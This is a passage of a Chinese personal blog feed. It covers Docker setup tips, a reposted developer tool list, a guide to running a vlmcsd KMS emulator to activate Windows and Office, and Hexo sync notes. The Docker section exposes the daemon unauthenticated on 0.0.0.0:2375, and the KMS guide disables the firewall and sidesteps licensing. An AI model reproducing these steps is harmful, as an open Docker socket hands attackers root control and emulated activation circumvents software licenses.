-m<span class="token variable">`</span></span> -o /usr/local/bin/docker-compose<span class="token function">chmod</span> +x /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">###容器方式运行(解决架构兼容问题)</span><span class="token comment">#方法一</span>docker run --rm -v /usr/local/bin:/dist gists/docker-compose-bin:latest <span class="token operator">&amp;&amp;</span> docker rmi gists/docker-compose-bin:latest<span class="token comment">#方法二</span><span class="token function">sudo</span> <span class="token function">curl</span> -L --fail https://raw.githubusercontent.com/linuxserver/docker-docker-compose/master/run.sh -o /usr/local/bin/docker-compose<span class="token function">sudo</span> <span class="token function">chmod</span> +x /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-开启远程访问"><a href="#5-开启远程访问" class="headerlink" title="5.开启远程访问"></a>5.开启远程访问</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 编辑启动配置文件</span><span class="token function">vi</span> /lib/systemd/system/docker.service<span class="token comment"># 找到ExecStart=/usr/bin/dockerd 这一行，如果处于注释状态请启用，</span><span class="token comment"># 检查是否包含 "-H tcp://0.0.0.0:2375", 如果不含就添加上。添加后如下：</span><span class="token comment">#&lt;centos7</span><span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375<span class="token comment">#&gt;=centos7</span><span class="token assign-left variable">ExecStart</span><span class="token operator">=</span>/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock<span class="token comment"># 重新加载服务的配置文件</span>systemctl daemon-reload<span class="token comment">#&lt;centos7</span><span class="token function">service</span> docker restart<span class="token comment">#&gt;=centos7</span>systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-清理构建失败的镜像"><a href="#6-清理构建失败的镜像" class="headerlink" title="6.清理构建失败的镜像"></a>6.清理构建失败的镜像</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 方法一：使用自带命令进行清理</span>docker system prune<span class="token comment"># 方法二：筛选清理</span>docker rmi <span class="token variable"><span class="token variable">$(</span>docker images <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">'&lt;none&gt;'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $3}'</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-修改容器（docker-update）"><a href="#7-修改容器（docker-update）" class="headerlink" title="7.修改容器（docker update）"></a>7.修改容器（docker update）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#重命名</span>docker <span class="token function">rename</span> 旧名称 新名称<span class="token comment">## 修改为开机自启</span><span class="token comment"># "no" 默认</span><span class="token comment"># always 总是启动</span><span class="token comment"># on-failure 如果执行失败</span><span class="token comment"># unless-stopped 除非停止</span>docker update --restart<span class="token operator">=</span>always 容器标识<span class="token comment"># 修改cpu限制 --cpuset-cpus 0-2/1/0,1 (可以是一个或多个)</span>docker update --cpuset-cpus <span class="token string">"1"</span> 容器标识<span class="token comment"># 修改内存限制（在ubuntu或其他基于Debian的系统上才会出现的问题，原因是系统默认未开启swap限制）</span>docker update -m 1500M --memory-swap 1500M  容器标识<span class="token comment"># 同时限制cpu和内存（在ubuntu或其他基于Debian的系统上才会出现的问题，原因是系统默认未开启swap限制）</span>docker update --cpuset-cpus <span class="token string">"1"</span> --memory <span class="token string">"1g"</span> 容器标识<span class="token comment">#控制容器竞争同一个cpu时间片的占比shares(最大1024)</span><span class="token comment">#只有当多个容器使用同一个核心时配置才生效(在没有抢占的情况下使用全部时间片)</span>docker update --cpuset-cpus <span class="token string">"1"</span> --cpuset-shares <span class="token number">500</span> --memory <span class="token string">"1g"</span> 容器标识<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-从镜像中提取-Dockerfile"><a href="#8-从镜像中提取-Dockerfile" class="headerlink" title="8.从镜像中提取 Dockerfile"></a>8.从镜像中提取 Dockerfile</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">###dfimage是一个alpine的镜像，启动的时候，通过将docker.sock映射到容器内部来运行，通常将这个操作做成别</span><span class="token comment">#使用alias创建别名(快捷指令)</span><span class="token builtin class-name">alias</span> <span class="token assign-left variable">dfimage</span><span class="token operator">=</span><span class="token string">"docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage"</span><span class="token comment">#例如提取nginx:latest的Dockerfile</span>dfimage nginx:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常用工具集(转)</title>
      <link href="/2019/12/10/yuque/vad9xv/"/>
      <url>/2019/12/10/yuque/vad9xv/</url>
      
        <content type="html"><![CDATA[<h1 id="数据来源于互联网"><a href="#数据来源于互联网" class="headerlink" title="数据来源于互联网"></a><strong>数据来源于互联网</strong></h1><h1 id="技术站点"><a href="#技术站点" class="headerlink" title="技术站点"></a><strong>技术站点</strong></h1><ul><li>Hacker News：非常棒的针对编程的链接聚合网站</li><li>Programming reddit：同上</li><li>MSDN：微软相关的官方技术集中地，主要是文档类</li><li>infoq：企业级应用，关注软件开发领域</li><li>OSChina：开源技术社区，开源方面做的不错哦</li><li>cnblogs，51cto，csdn：常见的技术社区，各有专长</li><li>stackoverflow：IT 技术问答网站</li><li>GitHub：全球最大的源代码管理平台，很多知名开源项目都在上面，如 Linux 内核</li><li>Gitee: 中国的源代码管理平台，很多半成品项目可以做二次开发，同时支持私有私有项目，访问速度快上面一步</li><li>OpenStack 等免费的 it 电子书：<a href="http://it-ebooks.info/">http://it-ebooks.info/</a></li><li>DevStore:开发者服务商店</li></ul><h1 id="平台工具"><a href="#平台工具" class="headerlink" title="平台工具"></a><strong>平台工具</strong></h1><ul><li>Redmine/Trac：项目管理平台</li><li>Jenkins/Jira(非开源)：持续集成系统（Apache Continuum，这个是 Apache 下的 CI 系统，还没来得及研究）</li><li>Sonar：代码质量管理平台</li><li>git，svn：源代码版本控制系统</li><li>GitLib/Gitorious：构建自己的 GitHub 服务器</li><li>gitbook：<a href="https://www.gitbook.io/%E5%86%99%E4%B9%A6%E7%9A%84%E5%A5%BD%E4%B8%9C%E8%A5%BF%EF%BC%8C%E5%BD%93%E7%84%B6%E7%94%A8%E6%9D%A5%E5%86%99%E6%96%87%E6%A1%A3%E4%B9%9F%E5%BE%88%E4%B8%8D%E9%94%99%E7%9A%84">https://www.gitbook.io/写书的好东西，当然用来写文档也很不错的</a></li><li>Travis-ci：开源项目持续集成必备，和 GitHub 相结合，<a href="https://travis-ci.org/">https://travis-ci.org/</a></li><li>开源测试工具、社区（Selenium、OpenQA.org）</li><li>Puppet:一个自动管理引擎，可以适用于 Linux、Unix 以及 Windows 平台。所谓配置管理系统，就是管理机器里面诸如文件、用户、进程、软件包这些资源。无论是管理 1 台，还是上万台机器 Puppet 都能轻松搞定。</li><li>Nagios：系统状态监控报警，还有个 Icinga(完全兼容 nagios 所有的插件,工作原理,配置文件以及方法,几乎一模一样。配置简单,功能强大)</li><li>Ganglia：分布式监控系统</li><li>fleet：分布式 init 系统</li></ul><h1 id="爬虫相关-好玩的工具"><a href="#爬虫相关-好玩的工具" class="headerlink" title="爬虫相关(好玩的工具)"></a><strong>爬虫相关(好玩的工具)</strong></h1><ul><li>Phantomjs</li><li>berserkJS(基于 Phantomjs 的改进版本)</li><li>SlimerJS</li><li>CasperJS</li><li>selenium</li><li>Web 服务器性能/压力测试工具/<a href="https://cloud.tencent.com/product/clb?from=10680">负载均衡</a>器</li><li>http_load: 程序非常小，解压后也不到 100K</li><li>webbench: 是 Linux 下的一个网站压力测试工具，最多可以模拟 3 万个并发连接去测试网站的负载能力</li><li>ab: ab 是 apache 自带的一款功能强大的测试工具</li><li>Siege: 一款开源的压力测试工具，可以根据配置对一个 WEB 站点进行多用户的并发访问，记录每个用户所有请求过程的相应时间，并在一定数量的并发访问下重复进行。</li><li>squid（前端缓存），nginx（负载），nodejs（没错它也可以，自己写点代码就能实现高性能的负载均衡器）：常用的负载均衡器</li><li>Piwik：开源网站访问量统计系统</li><li>ClickHeat：开源的网站点击情况热力图</li><li>HAProxy：高性能 TCP /HTTP 负载均衡器</li><li>ElasticSearch：搜索引擎基于 Lucene</li><li>Page Speed SDK 和 YSLOW<br>HAR Viewer: HAR 分析工具<br>protractor：E2E（end to end）自动化测试工具</li></ul><h1 id="Web-前端相关"><a href="#Web-前端相关" class="headerlink" title="Web 前端相关"></a><strong>Web 前端相关</strong></h1><ul><li>GRUNT: js task runner</li><li>Sea.js: js 模块化</li><li>knockout.js：MVVM 开发前台，绑定技术</li><li>Angular.js: 使用超动感 HTML &amp; JS 开发 WEB 应用！</li><li>Highcharts.js，Flot:常用的 Web 图表插件</li><li>Raw：非常不错的一款高级数据可视化工具</li><li>Rickshaw:时序图标库，可用于构建实时图表</li><li>JavaScript InfoVis Toolkit：另一款 Web 数据可视化插件</li><li>Pdf.js，在 html 中展现 pdf</li><li>ACE，CodeMirror：Html 代码编辑器（ACE 甚好啊）</li><li>NProcess：绚丽的加载进度条</li><li>impress.js：让你制作出令人眩目的内容展示效果(类似的还有 reveal)</li><li>Threejs：3DWeb 库</li><li>Hightopo：基于 Html5 的 2D、3D 可视化 UI 库</li><li>jQuery.dataTables.js:高度灵活的表格插件</li><li>Raphaël：js，canvas 绘图库，后来发现百度指数的图形就是用它绘出来的</li><li>director.js：js 路由模块，前端路由，Nodejs 后端路由等，适合构造单页应用</li><li>pace.js：页面加载进度条</li><li>bower：Web 包管理器</li><li>jsnice：有趣的 js 反编译工具，猜压缩后的变量名 <a href="http://www.jsnice.org/">http://www.jsnice.org/</a></li><li>D3.js: 是一个基于 JavaScript 数据展示库（类似的还有 P5.js）</li><li>Zepto.js：移动端替代 jQuery 的东东，当然也可以使用 jquery-mobile.</li><li>UI 框架：Foundation，Boostrap，Pure，EasyUI，Polymer</li><li>前端 UI 设计师必去的几个网站：Dribbble，awwwards，unmatchedstyle，UIMaker</li><li>Mozilla 开发者中心：<a href="https://developer.mozilla.org/en-US/">https://developer.mozilla.org/en-US/</a></li><li>图标资源：IcoMoon（我的最爱），Themify Icons，FreePik，Glyphiconsart</li><li>Dialog:非常漂亮的对话框</li><li>AdminLTE：github 上的一个开源项目，基于 Boostrap3 的后台管理页面框架</li><li>Respond.js：让不懂爱的 IE6-8 支持响应式设计</li><li>require.js: js 模块加载库</li><li>select2：比 chosen 具有更多特性的选择框替代库</li><li>AngularUI：集成 angular.js 的 UI 库</li><li>normalize.css: 采用了现代化标准让各浏览器渲染出的 html 保持一致的库</li><li>CreateJS：Html5 游戏引擎 Less,Compass:简化 CSS 开发</li><li>emojify.js:用于自动识别网页上的 Emoji 文字并将其显示为图像</li><li>simditor:一个不错的开源的 html 编辑器，简洁高效</li><li>Sencha: 基于 html5 的移动端开发框架</li><li>SuperScrollorama+TweenMax+skrollr:打造超酷的视差滚动效果网页动画</li><li>jquery-smooth-scroll:同上，平滑滚动插件</li><li>Animate.css:实现了各种动画效果的 css 库</li><li>Emmet:前端工程师必备，ZenCode 的前身</li><li>MagicDraw:Uml 图工具</li></ul><h1 id="大数据处理-数据分析-分布式工具"><a href="#大数据处理-数据分析-分布式工具" class="headerlink" title="大数据处理/数据分析/分布式工具"></a><strong>大数据处理/数据分析/分布式工具</strong></h1><ul><li>Hadoop：分布式的文件系统，结合其 MapReduce 编程模型可以用来做海量数据的批处理（Hive，Pig，HBase 啥的就不说了），值得介绍的是- Cloudera 的 Hadoop 分支 CDH5，基于 YARN MRv2 集成了 Spark 可直接用于生产环境的 Hadoop，对于企业快速构建数据仓库非常有用。</li><li>Ceph:Linux 分布式文件系统（特点：无中心）</li><li>Storm：实时流数据处理，可以看下 IBM 的一篇介绍 （还有个 Yahoo 的 S4，也是做流数据处理的）</li><li>Spark：大规模流式数据处理（可以应付企业中常见的三种数据处理场景：复杂的批量数据处理（batch data processing）；基于历史数据的交互式查询（interactive query）；基于实时数据流的数据处理（streaming data processing）），CSND 有篇文章介绍的不错</li><li>Spark Streaming：基于 Spark 的实时计算框架</li><li>Tachyon：分布式内存文件系统</li><li>Mesos：计算框架一个集群管理器，提供了有效的、跨分布式应用或框架的资源隔离和共享 Impala：新一代开源大数据分析引擎，提供 Sql 语义，比 Hive 强在速度上</li><li>SNAPPY：快速的数据压缩系统，适用于 Hadoop 生态系统中</li><li>Kafka:高吞吐量的分布式消息队列系统</li><li>ActiveMQ:是 Apache 出品，最流行的，能力强劲的开源消息总线</li><li>MQTT:Message Queuing Telemetry Transport，消息队列遥测传输）是 IBM 开发的一个即时通讯协议，有可能成为物联网的重要组成部分</li><li>RabbitMQ：记得 OpenStack 就是用的这个东西吧</li><li>ZeroMQ：宣称是将分布式计算变得更简单，是个分布式消息队列，可以看下云风的一篇文章的介绍开源的日志收集系统：scribe、chukwa、kafka、flume。这有一篇对比文章</li><li>Zookeeper：可靠的分布式协调的开源项目</li><li>Databus：LinkedIn 实时低延迟数据抓取系统</li><li>数据源获取：Flume、Google Refine、Needlebase、ScraperWiki、BloomReach</li><li>序列化技术：JSON、BSON、Thrift、Avro、Google Protocol Buffers</li><li>NoSql：Apache Hadoop、Apache Casandra、<a href="https://cloud.tencent.com/product/mongodb?from=10680">MongoDB</a>、Apache CouchDB、Redis、BigTable、HBase、Hypertable、Voldemort、 Neo4j</li><li>MapReduce 相关：Hive、Pig、Cascading、Cascalog、mrjob、Caffeine、S4、MapR、Acunu、Flume、Kafka、Azkaban、Oozie、 Greenplum</li><li>数据处理：R、Yahoo! Pipes、Mechanical Turk、Solr/ Lucene、ElasticSearch、Datameer、Bigsheets、TinkerpopNLP 自然语言处- 理：Natural Language Toolkit、Apache OpenNLP、Boilerpipe、OpenCalais</li><li>机器学习：WEKA、Mahout、scikits.learn、SkyTree</li><li>可视化技术：GraphViz、Processing、Protovis、Google Fusion Tables、Tableau、Highcharts、EChats（百度的还不错）、 Raphaël.js</li><li>Kettle：开源的 ETL 工具</li><li>Pentaho：以工作流为核心的开源 BI 系统</li><li>Mondrian：开源的 Rolap 服务器</li><li>Oozie：开源 hadoop 的工作流调度引擎</li><li>开源的数据分析可视化工具：Weka、Orange、KNIME</li><li>Cobar：阿里巴巴的 MySql 分布式中间件</li></ul><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a><strong>Python</strong></h1><ul><li>Eric,Eclipse+pydev,比较不错的 Python IDE</li><li>numpy:科学计算包，主要用来处理大型矩阵计算等，此外还有 SciPy，Matplotlib</li><li>GUI 相关：PyQt，PyQwt</li><li>supervisor:进程监控工具</li></ul><h1 id="Java-相关"><a href="#Java-相关" class="headerlink" title="Java 相关"></a><strong>Java 相关</strong></h1><ul><li>常用的 IDE：IntelliJ IDEA，Eclipse，Netbeans</li><li>Web 开发相关：Tomcat、Resin、Jetty、WebLogic 等，常用的组件 Struts，Spring</li><li>HibernateNetty: 异步事件驱动网络应用编程框架，用于高并发网络编程比较好（NIO 框架）</li><li>MINA：简单地开发高性能和高可靠性的网络应用程序（也是个 NIO 框架），不少手游服务端是用它开发的</li><li>jOOQ：java Orm 框架 Activiti:工作流引擎，类似的还有 jBPM、Snaker</li><li>Perfuse:是一个用户界面包用来把有结构与无结构数据以具有交互性的可视化图形展示出来.</li><li>Gephi:复杂网络分析软件, 其主要用于各种网络和复杂系统，动态和分层图的交互可视化与探测开源工具</li><li>Nutch:知名的爬虫项目，hadoop 就是从这个项目中发展出来的</li><li>web-harvest：Web 数据提取工具</li><li>POM 工具：Maven+ArtifactoryNetflix</li><li>Curator：Netflix 公司开源的一个 Zookeeper client library，用于简化 Zookeeper 客户端编程</li><li>Akka:一款基于 actor 模型实现的 并发处理框架</li><li>EclEmma：覆盖测试工具</li></ul><h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a><strong>常用工具</strong></h1><ul><li>Fiddler：非常好用的 Web 前端调试工具，当然是针对底层 http 协议的，一般情况使用 Chrome 等自带的调试工具也足够了，特殊情况还得用它去处理</li><li>wireshark：知名的网络数据包分析工具</li><li>PowerCmd:替代 Windows Cmd 的利器</li><li>RegexBuddy:强大的正则表达式测试工具</li><li>Soure Insight：源代码阅读神器</li><li>SublimeText：程序员最爱的编辑器</li><li>Database.NET：一个通用的<a href="https://cloud.tencent.com/product/cdb-overview?from=10680">关系型数据库</a>客户端，基于.NET 4.0 开发的，做简单的处理还是蛮方便的</li><li>Navicat Premium：支持 MySql、PostgreSQL、Oracle、Sqlite 和 SQL Server 的客户端，自带备份功能也用于数据库定时备份。</li><li>Synergy : 局域网内一套键盘鼠标控制多台电脑</li><li>DameWare：远程协助工具集（我在公司主要控制大屏幕用）</li><li>Radmin: 远程控制工具，用了一段时间的</li><li>DameWare，还要破解，对 Win7 支持的不好，还是发现这个好用</li><li>Listary：能极大幅度提高你 Windows 文件浏览与搜索速度效率的「超级神器」</li><li>Clover：给资源管理器加上多标签</li><li>WinLaunch：模拟 Mac OS 的 Launch 工具</li><li>Fritzing：绘制电路图</li><li>LICEcap：gif 教程制作 git，</li><li>svn：版本控制系统 Enigma Virtual Box（将 exe，dll 等封装成一个可执行程序）</li><li>Open DBDiff(针对 SqlServer)数据库同步</li><li>SymmetricDS：数据库同步</li><li>BIEE,Infomatica，SPSS，weka，R 语言：数据分析</li><li>CodeSmith，LightSwitch：代码生成</li><li>Pandoc：Markdown 转换工具，出书用的。以前玩过 docbook，不过现在还是 Markdown 盛行啊。</li><li>Window Magnet[Mac]：增强 Mac 窗口管理功能，想 Win7 一样具有窗口拖放到屏幕边缘自动调整的功能</li><li>log explorer：查看 SqlServer 日志 dependency</li><li>walker：查询 Windows 应用程序 dll 依赖项</li><li>Shairport4w：将 iPhone，iPad，iPod 上的音频通过 AirPlay 协议传输到 PC 上</li><li>ngrok：内网穿透工具 Axure:快速原型制作工具，还有个在线作图的工具国内的一个创业团队做的，用着很不错 <a href="http://www.processon.com/">http://www.processon.com</a></li><li>tinyproxy:（Linux）小型的代理服务器支持 http 和 https 协议 EaseUS Partition</li><li>Master：超级简单的分区调整工具，速度还是蛮快的，C 盘不够用了就用它从 D 盘划点空间吧，不用重装系统这么折腾哦。</li><li>CheatEngine：玩游戏修改内存值必备神器（记得我在玩轩辕剑 6 的时候就用的它，超级方便呢）</li><li>ApkIDE:Android 反编译神器翻、墙工具（自|由|门、天行浏览器）</li><li>设计工具：Sketch、OmniGraffle</li><li>XMIND：跨平台思维导图</li></ul><h1 id="转自-https-cloud-tencent-com-developer-article-1442059"><a href="#转自-https-cloud-tencent-com-developer-article-1442059" class="headerlink" title="转自:https://cloud.tencent.com/developer/article/1442059"></a>转自:<a href="https://cloud.tencent.com/developer/article/1442059">https://cloud.tencent.com/developer/article/1442059</a></h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>以搭建Windows &amp; Office服务器vlmcsd为例，讲解Linux创建自己的服务程序</title>
      <link href="/2019/10/18/yuque/wh3d22/"/>
      <url>/2019/10/18/yuque/wh3d22/</url>
      
        <content type="html"><![CDATA[<p><strong>一、配置<a href="http://www.kaixinit.com/tag/kms">KMS</a>服务器</strong></p><p>vlmcsd 从 github 下载<a href="https://github.com/Wind4/vlmcsd/releases">https://github.com/Wind4/vlmcsd/releases</a>下载最新版，以 2018-10-15 (svn1112)版本为例进行配置实现自启动。</p><p>因在线下载慢，我们就先下载下来后在进行配置。</p><p>1.配置前先更新一下 centos 系统，执行命令：</p><p>yum update</p><p>2.因为服务端配置为的系统为 centos 64 位，确定一下你这台机器的 CPU 架构执行命令：</p><p>cat /proc/cpuinfo</p><p>系统硬件为 intel 的 64 位 cpu，所以下载成功后，解压出来 binaries\Linux\intel\static\vlmcsd-x64-musl-static，将 vlmcsd-x64-musl-static 文件重命名为 vlmcsd，</p><p>文件下载：<a href="https://github.com/Wind4/vlmcsd/releases">vlmcsd</a></p><p>使用 winscp 软件上传 vlmcsd 文件到 centos 系统的/usr/bin/目录下，请设置 0755 的权限，执行命令：</p><p>chmod 755 /usr/bin/vlmcsd</p><p><a href="http://www.kaixinit.com/wp-content/uploads/2019/08/vlmcsd01.jpg"><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/264343/1571409515434-8baf2cd3-d17d-4077-a2dc-41399ea7eee9.jpeg#align=left&amp;display=inline&amp;height=329&amp;margin=%5Bobject%20Object%5D&amp;originHeight=329&amp;originWidth=692&amp;size=0&amp;status=done&amp;style=none&amp;width=692"></a></p><p>3.添加 vlmcsd 服务，新建 vlmcsd.pid 文件执行命令：</p><p>vi /var/run/vlmcsd.pid</p><p>输入 i 键，编辑最左下方出现 – INSERT –进行编辑代码内容如下：</p><p>内容为空白，不要输入，esc 键，再输入:wq 保存，新建一个空的文件保存就好了，主要目的用来存放 PID 的文件，便于后来添加 service 时要用到。</p><p>新建 vlmcsd.service 文件执行命令：</p><p>vi /lib/systemd/system/vlmcsd.service</p><p>在新建 vlmcsd.service 的文件中，输入以下内容：</p><p>[Unit]<br>Description=KMS Server By vlmcsd<br>After=network.target<br>[Service]<br>Type=forking<br>PIDFile=/var/run/vlmcsd.pid<br>ExecStart=/usr/bin/vlmcsd -p /var/run/vlmcsd.pid<br>ExecStop=/bin/kill -HUP $MAINPID<br>PrivateTmp=true<br>[Install]<br>WantedBy=multi-user.target</p><p>以上内容输入完毕，esc 键，再输入:wq 保存即可。</p><p>重载服务：systemctl daemon-reload</p><p>启动 VLMCSD：systemctl start vlmcsd</p><p>查看 VLMCSD 的运行状态：systemctl status vlmcsd</p><p>若出现类似如下显示，则表示已经运行</p><p><a href="http://www.kaixinit.com/wp-content/uploads/2019/08/vlmcsd02.jpg"><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/264343/1571409515519-40381dce-ddce-43ee-af22-1c84677277b4.jpeg#align=left&amp;display=inline&amp;height=224&amp;margin=%5Bobject%20Object%5D&amp;originHeight=224&amp;originWidth=643&amp;size=0&amp;status=done&amp;style=none&amp;width=643"></a></p><p>设置开机启动，依次执行以下命令：</p><p>systemctl enable vlmcsd<br>systemctl start vlmcsd<br>systemctl status vlmcsd</p><p>reboot 重启后，再试下查看 VLMCSD 的运行状态：systemctl status vlmcsd</p><p>1.显示在运行，可以正常激活，说明自启动部署成功</p><p>2.显示在运行，不能正常激活，说明防火墙在启用，端口 1688 被关闭了，需要开放才可以，具体如下：</p><p><strong>防火墙的使用，如果防火墙处于开启状态，vlmcsd 的端口为 1688 必须开放，否则无法提供服务。</strong></p><p>查看防火墙状态： <code>systemctl status firewalld.service</code></p><p>绿的 running 表示防火墙开启</p><p>执行关闭命令： systemctl stop firewalld.service</p><p>再次执行查看防火墙命令：systemctl status firewalld.service</p><p>执行开机禁用防火墙自启命令 &nbsp; ： systemctl disable firewalld.service</p><p>关于防火墙的其他命令：</p><p>启动：systemctl start firewalld.service</p><p>防火墙随系统开启启动 ： systemctl enable firewalld.service</p><p>停止：systemctl stop firewalld.service</p><p><strong>因为防火墙开启状态，需要开放 1688 执行命令如下：</strong></p><p>firewall-cmd –zone=public –add-port=1688/tcp –permanent</p><p><a href="http://www.kaixinit.com/wp-content/uploads/2019/08/vlmcsd03.jpg"><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/264343/1571409515605-54550d4f-ec78-458c-abb2-ac179b477d0f.jpeg#align=left&amp;display=inline&amp;height=207&amp;margin=%5Bobject%20Object%5D&amp;originHeight=207&amp;originWidth=640&amp;size=0&amp;status=done&amp;style=none&amp;width=640"></a></p><p>备注：如果添加连续的端口，执行命令如下：</p><p>firewall-cmd –zone=public –add-port=82-85/tcp –permanent</p><p>必须重启防火墙才可以访问，执行命令如下：</p><p>firewall-cmd –reload</p><p><strong>二、激活 win10</strong></p><p>以 Windows 10 企业版为例，cmd 管理员运行</p><p>slmgr.vbs -upk<br>slmgr.vbs -ipk NPPR9-FWDCX-D2C8J-H872K-2YT43<br>slmgr.vbs -skms 192.168.111.3<br>slmgr.vbs -dlv<br>slmgr.vbs /ato</p><p>以 Windows 10 enterprise ltsc_2019 为例，cmd 管理员运行</p><p>slmgr.vbs -upk<br>slmgr.vbs -ipk M7XTQ-FN8P6-TTKYV-9D4CC-J462D<br>slmgr.vbs -skms 192.168.111.3<br>slmgr.vbs -dlv<br>slmgr.vbs /ato</p><p><strong>三、激活 office2010 和 2016</strong></p><p>以 SW_DVD5_Office_Professional_Plus_2010w_SP1_64Bit_ChnSimp_CORE_MLF_X17-76742 为例，cmd 管理员运行，不是 PowerShell</p><p>cd C:\Program Files\Microsoft Office\Office14<br>cscript ospp.vbs /sethst:192.168.111.3<br>cscript ospp.vbs /act</p><p>以 SW_DVD5_Office_Professional_Plus_2016_64Bit_ChnSimp_MLF_X20-42426 为例，cmd 管理员运行，不是 PowerShell</p><p>cd C:\Program Files\Microsoft Office\Office16<br>cscript ospp.vbs /sethst:192.168.111.3<br>cscript ospp.vbs /act</p><p>以 cn_windows_server_2016_updated_feb_2018_x64_dvd_11636703.iso 为例，cmd 管理员运行，不是 PowerShell</p><p>slmgr /upk<br>slmgr /ipk WC2BQ-8NRM3-FDDYY-2BFGV-KHKQY<br>slmgr /skms 192.168.88.12<br>slmgr /ato</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用语雀编辑器写文章  同步到hexo</title>
      <link href="/2019/08/16/yuque/pvc0y4/"/>
      <url>/2019/08/16/yuque/pvc0y4/</url>
      
        <content type="html"><![CDATA[<p>安装和配置暂不写有时间更新。</p><h2 id="同步指令只需一下两条。"><a href="#同步指令只需一下两条。" class="headerlink" title="同步指令只需一下两条。"></a>同步指令只需一下两条。</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yuque-hexo <span class="token function">sync</span> <span class="token operator">&amp;&amp;</span> yuque-hexo clean  <span class="token comment">#更新同步语雀中文文章并清楚语雀的缓存</span><span class="token function">npm</span> run <span class="token function">sync</span> <span class="token operator">&amp;&amp;</span> hexo clean <span class="token operator">&amp;&amp;</span> hexo g -d <span class="token comment">#清楚博客本地缓存并将更新编译后发布到github</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理:"></a>错误处理:</h2><pre class="line-numbers language-none"><code class="language-none"># 1.公开库拉取文章提示： Error：fail to fetch article list, response。。。。# 解决方法：设置token ，详细解决位置：https://github.com/x-cold/yuque-hexo/issues/55# 2.图片不显示# 解决方法：是由于防盗链导致的，需要修改一下主题模板，详细解决位置：https://github.com/x-cold/yuque-hexo/issues/41# 备注：如果你用的也是Next主题，那么模板文件的路径为：your blog—&gt;themes—&gt;next—&gt;layout—&gt;_macro—&gt;post.swig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AutoLisp中常见的函数（转）</title>
      <link href="/2019/05/10/yuque/nml8vh/"/>
      <url>/2019/05/10/yuque/nml8vh/</url>
      
        <content type="html"><![CDATA[<p>一般的，用方括号<code>[ ]</code>包围的变量都是可有可无的。</p><h2 id="1-数学运算函数"><a href="#1-数学运算函数" class="headerlink" title="1. 数学运算函数"></a>1. 数学运算函数</h2><table><thead><tr><th>函数</th><th>返回值</th><th>备注</th></tr></thead><tbody><tr><td><code>(+ 数值1 数值2 …)</code></td><td>累计实数或整数数值</td><td>一个或多个参数</td></tr><tr><td><code>(- 数值1 数值2 …)</code></td><td>第一个数值减去第二个及以后数值的差</td><td>一个或多个参数</td></tr><tr><td><code>(* 数值1 数值2 …)</code></td><td>所有数值乘积</td><td>一个或多个参数</td></tr><tr><td><code>(/ 数值1 数值2 …)</code></td><td>第一个数值除以第二个以后数值的商</td><td>一个或多个参数</td></tr><tr><td><code>(l+ 数值)</code></td><td>数值+l</td><td>-</td></tr><tr><td><code>(1- 数值)</code></td><td>数值-l</td><td>-</td></tr><tr><td><code>(abs 数值)</code></td><td>数值的绝对值</td><td>-</td></tr><tr><td><code>(atan 数值1 [数值2])</code></td><td>反正切值</td><td>可以有两个参数</td></tr><tr><td><code>(cos 角度)</code></td><td>角度的余弦值</td><td>角度值为弧度</td></tr><tr><td><code>(exp 数值)</code></td><td>自然常数 e 为底的指数</td><td>e 的值约为 2.71828</td></tr><tr><td><code>(expt 底数 指数)</code></td><td>底数的指数值</td><td>-</td></tr><tr><td><code>(fix 数值)</code></td><td>将数值转换为整数值</td><td>直接忽略小数部分</td></tr><tr><td><code>(float数值)</code></td><td>将数值转换为实数值</td><td>-</td></tr><tr><td><code>(gcd 数值1 数值2)</code></td><td>两数值的最大公因数</td><td></td></tr><tr><td><code>(log 数值)</code></td><td>数值的自然对数值</td><td>-</td></tr><tr><td><code>(max 数值1 数值2 …)</code></td><td>数值中的最大值</td><td>-</td></tr><tr><td><code>(min 数值1 数值2 …)</code></td><td>数值中的最小值</td><td>-</td></tr><tr><td><code>pi</code></td><td>常数 π，不是函数，使用时不用加括号</td><td>其值约为<code>3.141593</code></td></tr><tr><td><code>(rem 数值1 数值2)</code></td><td>数值 1 除以数值 2 得到余数</td><td>余数的正负与被除数相同</td></tr><tr><td><code>(sin 